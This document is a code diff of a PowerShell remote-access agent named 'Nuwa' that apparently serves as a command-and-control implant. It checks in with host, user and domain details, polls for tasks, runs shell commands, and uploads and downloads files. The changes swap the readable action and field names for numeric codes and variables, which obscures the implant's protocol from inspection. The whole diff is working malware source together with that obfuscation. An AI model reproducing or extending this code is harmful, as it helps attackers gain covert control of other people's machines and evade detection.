@@ -36,29 +36,6 @@ function Resolve-NuwaPath {
     }
 }
 
-function Get-NuwaCodecContext {
-    [CmdletBinding()]
-    param(
-        [Parameter(Mandatory = $true)]
-        [string]$Direction,
-
-        [Parameter(Mandatory = $true)]
-        [string]$Uuid,
-
-        [Parameter(Mandatory = $true)]
-        [string]$MessageType
-    )
-
-    return @{
-        direction = $Direction
-        uuid = $Uuid
-        message_type = $MessageType
-        c2_profile = [string]$script:NuwaConfig.C2Profile
-        codec_profile = $script:NuwaConfig.CodecProfile
-        codec_version = '1'
-    }
-}
-
 function ConvertFrom-NuwaJsonObject {
     [CmdletBinding()]
     param(
@@ -70,7 +47,8 @@ function ConvertFrom-NuwaJsonObject {
     if ([string]::IsNullOrWhiteSpace($Value)) {
         return $null
     }
-    return ($Value | ConvertFrom-Json)
+    $parsed = $Value | ConvertFrom-Json -ErrorAction Stop
+    return (ConvertFrom-NuwaAgentJsonValue -Value $parsed)
 }
 
 function Invoke-NuwaSendMessage {
@@ -80,7 +58,7 @@ function Invoke-NuwaSendMessage {
         [string]$Uuid,
 
         [Parameter(Mandatory = $true)]
-        [string]$Action,
+        [int]$Action,
 
         [Parameter(Mandatory = $false)]
         [hashtable]$Body = @{}
@@ -90,10 +68,10 @@ function Invoke-NuwaSendMessage {
     foreach ($key in $Body.Keys) {
         $message[$key] = $Body[$key]
     }
-    $message.action = $Action
+    $message[$script:NuwaF_action] = $Action
     $message = Add-NuwaMessageMetadata -Message $message
 
-    [byte[]]$wireBody = ConvertTo-NuwaWireBytes -Message $message -Context (Get-NuwaCodecContext -Direction 'outbound' -Uuid $Uuid -MessageType $Action)
+    [byte[]]$wireBody = ConvertTo-NuwaWireBytes -Message $message -Context @{}
     Write-NuwaDebug ("Sending action {0} for {1}" -f $Action, $Uuid)
     $rawResponse = Invoke-NuwaTransport -Uuid $Uuid -Action $Action -WireBody $wireBody
     if ($null -eq $rawResponse -or ([byte[]]$rawResponse).Length -eq 0) {
@@ -105,7 +83,7 @@ function Invoke-NuwaSendMessage {
         -ResponseBody $rawResponse `
         -ExpectedUuid $Uuid `
         -UuidLength $script:NuwaConfig.MessageUuidLength `
-        -Context (Get-NuwaCodecContext -Direction 'inbound' -Uuid $Uuid -MessageType $Action)
+        -Context @{}
     Write-NuwaDebug ("Received response for action {0} ({1} characters)" -f $Action, $decodedJson.Length)
     return (ConvertFrom-NuwaJsonObject -Value $decodedJson)
 }
@@ -114,7 +92,7 @@ function Invoke-NuwaUpdateInfo {
     [CmdletBinding()]
     param(
         [Parameter(Mandatory = $false)]
-        [string]$SleepInfo,
+        [object]$SleepInfo,
 
         [Parameter(Mandatory = $false)]
         [string]$Cwd
@@ -125,35 +103,35 @@ function Invoke-NuwaUpdateInfo {
     }
 
     $body = @{}
-    if (-not [string]::IsNullOrWhiteSpace($SleepInfo)) {
-        $body.sleep_info = $SleepInfo
+    if ($null -ne $SleepInfo) {
+        $body[$script:NuwaF_sleep_info] = $SleepInfo
     }
     if (-not [string]::IsNullOrWhiteSpace($Cwd)) {
-        $body.cwd = $Cwd
+        $body[$script:NuwaF_cwd] = $Cwd
     }
     if ($body.Count -eq 0) {
         return
     }
-    [void](Invoke-NuwaSendMessage -Uuid $script:NuwaState.CallbackUUID -Action 'update_info' -Body $body)
+    [void](Invoke-NuwaSendMessage -Uuid $script:NuwaState.CallbackUUID -Action $script:NuwaA_update_info -Body $body)
 }
 
 function Get-NuwaCheckinMessage {
     [CmdletBinding()]
     param()
 
-    $osValue = if ($env:OS) { [string]$env:OS } else { 'Windows' }
-    $architecture = if ($env:PROCESSOR_ARCHITECTURE -match '64') { 'x64' } else { 'x86' }
-    return @{
-        ip = ''
-        os = $osValue
-        user = Invoke-NuwaWhoami
-        host = Invoke-NuwaHostname
-        domain = $env:USERDOMAIN
-        pid = $PID
-        uuid = $script:NuwaConfig.PayloadUUID
-        architecture = $architecture
-        cwd = $script:NuwaState.CurrentDirectory
-    }
+    $osValue = if ($env:OS) { [string]$env:OS } else { $script:NuwaH_Windows }
+    $architecture = if ($env:PROCESSOR_ARCHITECTURE -match '64') { $script:NuwaH_x64 } else { $script:NuwaH_x86 }
+    $result = @{}
+    $result[$script:NuwaF_ip] = ''
+    $result[$script:NuwaF_os] = $osValue
+    $result[$script:NuwaF_user] = Invoke-NuwaWhoami
+    $result[$script:NuwaF_host] = Invoke-NuwaHostname
+    $result[$script:NuwaF_domain] = $env:USERDOMAIN
+    $result[$script:NuwaF_pid] = $PID
+    $result[$script:NuwaF_uuid] = $script:NuwaConfig.PayloadUUID
+    $result[$script:NuwaF_architecture] = $architecture
+    $result[$script:NuwaF_cwd] = $script:NuwaState.CurrentDirectory
+    return $result
 }
 
 function Invoke-NuwaCheckin {
@@ -166,9 +144,9 @@ function Invoke-NuwaCheckin {
     }
 
     for ($attempt = 1; $attempt -le 3; $attempt += 1) {
-        $response = Invoke-NuwaSendMessage -Uuid $script:NuwaConfig.PayloadUUID -Action 'checkin' -Body (Get-NuwaCheckinMessage)
-        if ($null -ne $response -and $response.id) {
-            $script:NuwaState.CallbackUUID = [string]$response.id
+        $response = Invoke-NuwaSendMessage -Uuid $script:NuwaConfig.PayloadUUID -Action $script:NuwaA_checkin -Body (Get-NuwaCheckinMessage)
+        if ($null -ne $response -and $response[$script:NuwaF_id]) {
+            $script:NuwaState.CallbackUUID = [string]$response[$script:NuwaF_id]
             Write-NuwaDebug "Checked in as $($script:NuwaState.CallbackUUID)"
             return
         }
@@ -186,32 +164,34 @@ function ConvertTo-NuwaCommandParameters {
     [CmdletBinding()]
     param(
         [Parameter(Mandatory = $true)]
-        [string]$CommandName,
+        [int]$CommandName,
 
         [Parameter(Mandatory = $false)]
-        [string]$RawParameters
+        [object]$RawParameters
     )
 
-    if ([string]::IsNullOrWhiteSpace($RawParameters)) {
-        return @{}
+    if ($RawParameters -is [System.Collections.IDictionary]) {
+        if (-not $RawParameters.ContainsKey($script:NuwaQ_raw_text)) {
+            return $RawParameters
+        }
+        $rawText = [string]$RawParameters[$script:NuwaQ_raw_text]
+    } else {
+        $rawText = [string]$RawParameters
     }
 
-    if ($RawParameters.TrimStart().StartsWith('{')) {
-        $parsed = $RawParameters | ConvertFrom-Json
+    if ([string]::IsNullOrWhiteSpace($rawText)) { return @{} }
+    if ($CommandName -eq $script:NuwaC_shell) {
         $result = @{}
-        foreach ($property in $parsed.PSObject.Properties) {
-            $result[$property.Name] = $property.Value
-        }
+        $result[$script:NuwaQ_command] = $rawText
         return $result
     }
-
-    switch ($CommandName) {
-        'shell' { return @{ command = $RawParameters } }
-        'download' { return @{ path = $RawParameters } }
-        'cd' { return @{ path = $RawParameters } }
-        'ls' { return @{ path = $RawParameters } }
-        default { return @{} }
+    if ($CommandName -eq $script:NuwaC_download -or $CommandName -eq $script:NuwaC_cd -or
+        $CommandName -eq $script:NuwaC_ls) {
+        $result = @{}
+        $result[$script:NuwaQ_path] = $rawText
+        return $result
     }
+    return @{}
 }
 
 function Invoke-NuwaTask {
@@ -221,73 +201,70 @@ function Invoke-NuwaTask {
         [object]$Task
     )
 
-    $response = @{
-        task_id = [string]$Task.id
-        completed = $true
-    }
-    $commandName = [string]$Task.command
-    Write-NuwaDebug ("Starting task {0} ({1})" -f [string]$Task.id, $commandName)
+    $commandCode = [int]$Task[$script:NuwaF_command]
+    $taskId = [string]$Task[$script:NuwaF_id]
+    $response = @{}
+    $response[$script:NuwaF_task_id] = $taskId
+    $response[$script:NuwaF_completed] = $true
+    Write-NuwaDebug ("Starting task {0} ({1})" -f $taskId, $commandCode)
 
     try {
-        $parameters = ConvertTo-NuwaCommandParameters -CommandName $commandName -RawParameters ([string]$Task.parameters)
-        switch ($commandName) {
-            'sleep' {
+        $parameters = ConvertTo-NuwaCommandParameters -CommandName $commandCode -RawParameters $Task[$script:NuwaF_parameters]
+        if ($commandCode -eq $script:NuwaC_sleep) {
                 $sleepInfo = Invoke-NuwaSleep -Parameters $parameters
-                $response.user_output = 'Sleep updated'
+                $response[$script:NuwaF_user_output] = New-NuwaDiagnosticOutput -Code 1045
                 Invoke-NuwaUpdateInfo -SleepInfo $sleepInfo
-            }
-            'cd' {
+        } elseif ($commandCode -eq $script:NuwaC_cd) {
                 $newCwd = Invoke-NuwaCd -Parameters $parameters
-                $response.user_output = $newCwd
+                $response[$script:NuwaF_user_output] = $newCwd
                 Invoke-NuwaUpdateInfo -Cwd $newCwd
-            }
-            'whoami' {
-                $response.user_output = Invoke-NuwaWhoami
-            }
-            'hostname' {
-                $response.user_output = Invoke-NuwaHostname
-            }
-            'exit' {
-                $response.user_output = Invoke-NuwaExit
-            }
-            'ls' {
-                $response.user_output = Invoke-NuwaLs -Parameters $parameters
-            }
-            'shell' {
+        } elseif ($commandCode -eq $script:NuwaC_whoami) {
+            $whoami = Invoke-NuwaWhoami
+            $response[$script:NuwaF_user_output] = if ($whoami -is [int] -and $whoami -eq $script:NuwaH_unknown) {
+                New-NuwaDiagnosticOutput -Code 1084
+            } else { $whoami }
+        } elseif ($commandCode -eq $script:NuwaC_hostname) {
+            $hostname = Invoke-NuwaHostname
+            $response[$script:NuwaF_user_output] = if ($hostname -is [int] -and $hostname -eq $script:NuwaH_unknown_host) {
+                New-NuwaDiagnosticOutput -Code 1085
+            } else { $hostname }
+        } elseif ($commandCode -eq $script:NuwaC_exit) {
+            $response[$script:NuwaF_user_output] = Invoke-NuwaExit
+        } elseif ($commandCode -eq $script:NuwaC_ls) {
+            $response[$script:NuwaF_user_output] = Invoke-NuwaLs -Parameters $parameters
+        } elseif ($commandCode -eq $script:NuwaC_shell) {
                 $shellResult = Invoke-NuwaShell -Parameters $parameters
-                $response.user_output = $shellResult.user_output
-                $response.process_response = $shellResult.process_response
-            }
-            'upload' {
-                $uploadResponse = Invoke-NuwaUpload -TaskId ([string]$Task.id) -Parameters $parameters
+                $response[$script:NuwaF_user_output] = $shellResult[$script:NuwaF_user_output]
+                $response[$script:NuwaF_process_response] = $shellResult[$script:NuwaF_process_response]
+        } elseif ($commandCode -eq $script:NuwaC_upload) {
+                $uploadResponse = Invoke-NuwaUpload -TaskId $taskId -Parameters $parameters
                 foreach ($key in $uploadResponse.Keys) {
                     $response[$key] = $uploadResponse[$key]
                 }
-            }
-            'download' {
-                $response.user_output = Invoke-NuwaDownload -TaskId ([string]$Task.id) -Parameters $parameters
-            }
-            default {
-                throw ("Unsupported command '{0}'" -f $commandName)
-            }
+        } elseif ($commandCode -eq $script:NuwaC_download) {
+            $response[$script:NuwaF_user_output] = Invoke-NuwaDownload -TaskId $taskId -Parameters $parameters
+        } else {
+            throw ("Unsupported command code {0}" -f $commandCode)
         }
     } catch {
         # NUWA_TASK_ERROR_BEGIN
-        $response.user_output = ($_ | Out-String).TrimEnd()
+        $diagnostic = $_.TargetObject
+        if ($diagnostic -is [object[]] -and $diagnostic.Length -eq 4 -and
+            $diagnostic[0] -is [int] -and $diagnostic[0] -eq 20053 -and
+            $diagnostic[1] -is [int] -and $diagnostic[1] -eq 1) {
+            $response[$script:NuwaF_user_output] = $diagnostic
+        } else {
+            $response[$script:NuwaF_user_output] = ($_ | Out-String).TrimEnd()
+        }
         # NUWA_TASK_ERROR_END
-        $response.status = 'error'
-        Write-NuwaDebug ("Task {0} raised {1}" -f [string]$Task.id, ($_ | Out-String).TrimEnd())
+        $response[$script:NuwaF_status] = $script:NuwaS_error
+        Write-NuwaDebug ("Task {0} raised {1}" -f $taskId, ($_ | Out-String).TrimEnd())
     }
 
-    $responseStatus = if (
-        $response.ContainsKey('status') -and
-        -not [string]::IsNullOrWhiteSpace([string]$response.status)
-    ) {
-        [string]$response.status
-    } else {
-        'success'
-    }
-    Write-NuwaDebug ("Completed task {0} with status {1}" -f [string]$Task.id, $responseStatus)
+    $responseStatus = if ($response.ContainsKey($script:NuwaF_status)) {
+        [int]$response[$script:NuwaF_status]
+    } else { $script:NuwaS_success }
+    Write-NuwaDebug ("Completed task {0} with status {1}" -f $taskId, $responseStatus)
 
     return $response
 }
@@ -308,11 +285,14 @@ function Invoke-NuwaTaskLoop {
             break
         }
 
-        $tasking = Invoke-NuwaSendMessage -Uuid $script:NuwaState.CallbackUUID -Action 'get_tasking' -Body @{ tasking_size = -1 }
-        if ($tasking -and $tasking.tasks) {
-            Write-NuwaDebug ("Received {0} task(s)" -f $tasking.tasks.Count)
-            foreach ($task in $tasking.tasks) {
-                $taskId = [string]$task.id
+        $request = @{}
+        $request[$script:NuwaF_tasking_size] = -1
+        $tasking = Invoke-NuwaSendMessage -Uuid $script:NuwaState.CallbackUUID -Action $script:NuwaA_get_tasking -Body $request
+        $tasks = if ($null -ne $tasking) { $tasking[$script:NuwaF_tasks] } else { $null }
+        if ($null -ne $tasks -and @($tasks).Count -gt 0) {
+            Write-NuwaDebug ("Received {0} task(s)" -f @($tasks).Count)
+            foreach ($task in @($tasks)) {
+                $taskId = [string]$task[$script:NuwaF_id]
                 if (
                     -not [string]::IsNullOrWhiteSpace($taskId) -and
                     $script:NuwaCompletedTaskResponses.ContainsKey($taskId)
@@ -339,7 +319,9 @@ function Invoke-NuwaTaskLoop {
                     }
                 }
                 Write-NuwaDebug ("Sending post_response for task {0}" -f $taskId)
-                [void](Invoke-NuwaSendMessage -Uuid $script:NuwaState.CallbackUUID -Action 'post_response' -Body @{ responses = @($response) })
+                $responseBody = @{}
+                $responseBody[$script:NuwaF_responses] = @($response)
+                [void](Invoke-NuwaSendMessage -Uuid $script:NuwaState.CallbackUUID -Action $script:NuwaA_post_response -Body $responseBody)
                 if ($script:NuwaState.ExitRequested) {
                     break
                 }
